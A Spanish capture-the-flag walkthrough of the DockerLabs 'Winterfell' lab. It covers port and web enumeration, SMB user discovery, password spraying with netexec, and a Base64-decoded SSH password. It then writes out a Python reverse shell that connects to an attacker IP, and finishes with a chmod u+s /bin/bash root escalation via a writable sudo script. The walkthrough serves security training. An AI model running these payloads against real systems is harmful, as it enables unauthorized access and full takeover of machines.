---
icon: flag
---

# Winterfell DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip winterfell.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh winterfell.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 09:44 EST
Nmap scan report for express.dl (172.17.0.2)
Host is up (0.000036s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 39:f8:44:51:19:1a:a9:78:c2:21:e6:19:d3:1e:41:96 (ECDSA)
|_  256 43:9b:ac:9c:d3:0c:ad:95:44:3a:c3:fb:9e:df:3e:a2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.61 ((Debian))
|_http-title: Juego de Tronos
|_http-server-header: Apache/2.4.61 (Debian)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-20T14:44:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.64 seconds
```

Si vemos que contiene la pagina, veremos que es muy normalita, por lo que haremos un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/dragon               (Status: 200) [Size: 942]
/index.html           (Status: 200) [Size: 1729]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un directorio interesante llamado `/dragon`, vamos a ver que contiene:

Si entramos dentro de `/dragon` veremos un archivo llamado `EpisodiosT1` y si entramos dentro, veremos lo siguiente:

```
Estos son todos los Episodios de la primera  temporada de Juego de tronos.
Tengo la barra espaciadora estropeada por lo que dejare los nombres sin espacios, perdonad las molestias

seacercaelinvierno
elcaminoreal
lordnieve
tullidosbastardosycosasrotas
elloboyelleon
unacoronadeoro
ganasomueres
porelladodelapunta
baelor
fuegoyhielo
```

Vemos que parecen ser `contraseñas` de algun usuario del sistema, por lo que vamos a probar a tirar un `hydra` con lista de usuarios al puerto de `SMB` y que por `SSH` no veremos nada.

Pero antes tendremos que identificar que usuarios hay, como tenemos el `SMB` podremos intentar enumerarlo:

## Escalate user jon

### enum4linux

```shell
enum4linux <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jan 20 09:56:39 2025

 =========================================( Target Information )=========================================

Target ........... 172.17.0.2
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 172.17.0.2 )=============================


[E] Can't find workgroup/domain



 =================================( Nbtstat Information for 172.17.0.2 )=================================

Looking up status of 172.17.0.2
No reply from 172.17.0.2

 ====================================( Session Check on 172.17.0.2 )====================================
                                                                                                                                  
                                                                                                                                  
[+] Server 172.17.0.2 allows sessions using username '', password ''                                                              
                                                                                                                                  
                                                                                                                                  
 =================================( Getting domain SID for 172.17.0.2 )=================================
                                                                                                                                  
Domain Name: WORKGROUP                                                                                                            
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                              
                                                                                                                                  
                                                                                                                                  
 ====================================( OS information on 172.17.0.2 )====================================
                                                                                                                                  
                                                                                                                                  
[E] Can't get OS info with smbclient                                                                                              
                                                                                                                                  
                                                                                                                                  
[+] Got OS info for 172.17.0.2 from srvinfo:                                                                                      
        83214CBA54C7   Wk Sv PrQ Unx NT SNT Samba 4.17.12-Debian                                                                  
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ========================================( Users on 172.17.0.2 )========================================
                                                                                                                                  
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: jon      Name:   Desc:                                                             

user:[jon] rid:[0x3e8]

 ==================================( Share Enumeration on 172.17.0.2 )==================================
                                                                                                                                  
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                             

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shared          Disk      
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2                                                                                        
                                                                                                                                  
//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A                                                                 
//172.17.0.2/shared     Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                    
                                                                                                                                  
NT_STATUS_CONNECTION_REFUSED listing \*                                                                                           
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A
//172.17.0.2/nobody     Mapping: DENIED Listing: N/A Writing: N/A

 =============================( Password Policy Information for 172.17.0.2 )=============================
                                                                                                                                  
                                                                                                                                  

[+] Attaching to 172.17.0.2 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] 83214CBA54C7
        [+] Builtin

[+] Password Info for Domain: 83214CBA54C7

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                              
                                                                                                                                  
                                                                                                                                  
Password Complexity: Disabled                                                                                                     
Minimum Password Length: 5


 ========================================( Groups on 172.17.0.2 )========================================
                                                                                                                                  
                                                                                                                                  
[+] Getting builtin groups:                                                                                                       
                                                                                                                                  
                                                                                                                                  
[+]  Getting builtin group memberships:                                                                                           
                                                                                                                                  
                                                                                                                                  
[+]  Getting local groups:                                                                                                        
                                                                                                                                  
                                                                                                                                  
[+]  Getting local group memberships:                                                                                             
                                                                                                                                  
                                                                                                                                  
[+]  Getting domain groups:                                                                                                       
                                                                                                                                  
                                                                                                                                  
[+]  Getting domain group memberships:                                                                                            
                                                                                                                                  
                                                                                                                                  
 ===================( Users on 172.17.0.2 via RID cycling (RIDS: 500-550,1000-1050) )===================
                                                                                                                                  
                                                                                                                                  
[I] Found new SID:                                                                                                                
S-1-22-1                                                                                                                          

[I] Found new SID:                                                                                                                
S-1-5-32                                                                                                                          

[I] Found new SID:                                                                                                                
S-1-5-32                                                                                                                          

[I] Found new SID:                                                                                                                
S-1-5-32                                                                                                                          

[I] Found new SID:                                                                                                                
S-1-5-32                                                                                                                          

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                       
                                                                                                                                  
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                 
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-3269527173-155815558-2590245247 and logon username '', password ''                       
                                                                                                                                  
S-1-5-21-3269527173-155815558-2590245247-501 83214CBA54C7\nobody (Local User)                                                     
S-1-5-21-3269527173-155815558-2590245247-513 83214CBA54C7\None (Domain Group)
S-1-5-21-3269527173-155815558-2590245247-1000 83214CBA54C7\jon (Local User)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                       
                                                                                                                                  
S-1-22-1-1000 Unix User\jon (Local User)                                                                                          
S-1-22-1-1001 Unix User\aria (Local User)
S-1-22-1-1002 Unix User\daenerys (Local User)

 ================================( Getting printer info for 172.17.0.2 )================================
                                                                                                                                  
No printers returned.                                                                                                             


enum4linux complete on Mon Jan 20 09:57:19 2025
```

Vemos que hay un usuario llamado `jon`, por lo que haremos lo siguiente...

### netexec

> dic.txt

```
seacercaelinvierno
elcaminoreal
lordnieve
tullidosbastardosycosasrotas
elloboyelleon
unacoronadeoro
ganasomueres
porelladodelapunta
baelor
fuegoyhielo
```

```shell
netexec smb <IP> -u jon -p dic.txt
```

Info:

```
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating default workspace
[*] Initializing SMB protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing WMI protocol database
[*] Initializing WINRM protocol database
[*] Initializing MSSQL protocol database
[*] Initializing VNC protocol database
[*] Initializing LDAP protocol database
[*] Copying default configuration file
SMB         172.17.0.2      445    83214CBA54C7     [*] Windows 6.1 Build 0 (name:83214CBA54C7) (domain:83214CBA54C7) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    83214CBA54C7     [+] 83214CBA54C7\jon:seacercaelinvierno 
```

Vemos que hemos encontrado las credenciales del usuario `jon` para el `SMB`, por lo que vamos a listar los recursos compartidos que tiene la maquina:

### smbclient

```shell
smbclient -L //<IP>/ -N
```

Info:

```
 Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shared          Disk      
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      Home Directories
```

Vemos que hay un recurso creado por el usuario llamado `shared` por lo que vamos a conectarnos a el mediante las credenciales obtenidas anteriormente:

```shell
smbclient //<IP>/shared -U jon
```

Metemos como contraseña `seacercaelinvierno` y veremos que estamos dentro.

Si listamos veremos lo siguiente:

```
  .                                   D        0  Tue Jul 16 16:26:00 2024
  ..                                  D        0  Tue Jul 16 16:25:59 2024
  proteccion_del_reino                N      313  Tue Jul 16 16:26:00 2024
```

Nos vamos a descargar el archivo y ver que contiene:

```shell
get proteccion_del_reino
```

Si lo leemos veremos lo siguiente:

```
Aria de ti depende que los caminantes blancos no consigan pasar el muro. 
Tienes que llevar a la reina Daenerys el mensaje, solo ella sabra interpretarlo. Se encuentra cifrado en un lenguaje antiguo y dificil de entender. 
Esta es mi contraseña, se encuentra cifrada en ese lenguaje y es -> aGlqb2RlbGFuaXN0ZXI=
```

Vemos que hay un codigo en `Base64`, si lo decodificamos veremos lo siguiente:

```
hijodelanister
```

Puede ser que sea la credencial de `jon` para el `ssh`, por lo que haremos lo siguiente:

```shell
ssh jon@<IP>
```

Metemos como contraseña `hijodelanister` y veremos que estamos dentro como dicho usuario.

## Escalate user aria

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for jon on 83214cba54c7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jon may run the following commands on 83214cba54c7:
    (aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py
```

Vemos que podemos ejecutar el script `/home/jon/.mensaje.py` como el usuario `aria`, por lo que haremos lo siguiente:

Primero vemos que el script esta en nuestra carpeta de la `home` por lo que podremos eliminarla y crear una nueva con el mismo nombre con el contenido que queramos:

```shell
rm /home/jon/.mensaje.py
nano /home/jon/.mensaje.py

#Dentro del nano
#!/bin/python3

import socket
import subprocess
import os

# Configuración del atacante (IP y puerto)
ATTACKER_IP = "<IP>"  # Reemplázalo con tu IP
ATTACKER_PORT = <PORT>           # Reemplázalo con tu puerto

# Establecer conexión con el atacante
def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # Redirigir entrada, salida y errores al socket
        os.dup2(s.fileno(), 0)  # STDIN
        os.dup2(s.fileno(), 1)  # STDOUT
        os.dup2(s.fileno(), 2)  # STDERR
        
        # Iniciar shell
        subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        print(f"Error: {e}")
        s.close()

if __name__ == "__main__":
    reverse_shell()
```

Lo guardamos y ejecutamos lo siguiente:

En nuestro `host` nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora ejecutamos en la maquina victima lo siguiente:

```shell
sudo -u aria python3 /home/jon/.mensaje.py
```

Una vez ejecutado eso, veremos lo siguiente si nos vamos a nuestra escucha:

```
listening on [any] 7777 ...
connect to [192.168.120.128] from (UNKNOWN) [172.17.0.2] 41662
aria@83214cba54c7:/home/jon$ 
```

Vemos que hemos obtenido la shell como el usuario `aria`.

## Escalate user daenerys

### Sanitización la shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for aria on 83214cba54c7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User aria may run the following commands on 83214cba54c7:
    (daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls
```

Vemos que podemos ejecutar `cat` y `ls` como el usuario `daenerys`, por lo que haremos lo siguiente:

```shell
sudo -u daenerys ls /home/daenerys/
```

Info:

```
mensajeParaJon
```

Vemos que hay un archivo, que si lo leemos veremos lo siguiente:

```shell
sudo -u daenerys cat /home/daenerys/mensajeParaJon
```

Info:

```
Aria estare encantada de ayudar a Jon con la guerra en el norte, siempre y cuando despues Jon cumpla y me ayude a  recuperar el trono de hierro. 
Te dejo en este mensaje la contraseña de mi usuario por si necesitas llamar a uno de mis dragones desde tu ordenador.

!drakaris!
```

Vemos que puede ser la contraseña del usuario `daenerys`, por lo que haremos lo siguiente:

```shell
su daenerys
```

Metemos como contraseña `drakaris`, y veremos que somo dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for daenerys on 83214cba54c7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User daenerys may run the following commands on 83214cba54c7:
    (ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

Vemos que podemos ejecutar el binario `bash` junto con `/home/daenerys/.secret/.shell.sh` como el usuario `root`, por lo que haremos lo siguiente:

Si hacemos lo siguiente:

```shell
ls -la /home/daenerys/.secret/
```

Info:

```
total 12
drwxr-xr-x 1 root     root     4096 Jul 16  2024 .
drwx------ 1 daenerys daenerys 4096 Jul 16  2024 ..
-rwxr-xr-x 1 daenerys daenerys   57 Jul 16  2024 .shell.sh
```

Vemos que podemos editar el archivo, por lo que haremos lo siguiente:

```shell
nano .shell.sh

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
```

Lo guardamos y ejecutamos lo siguiente:

```shell
sudo bash /home/daenerys/.secret/.shell.sh
```

Ahora si listamos la `bash`:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

Vemos que ha funcionado, por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Y con esto seremos `root`, por lo que habremos terminado la maquina.
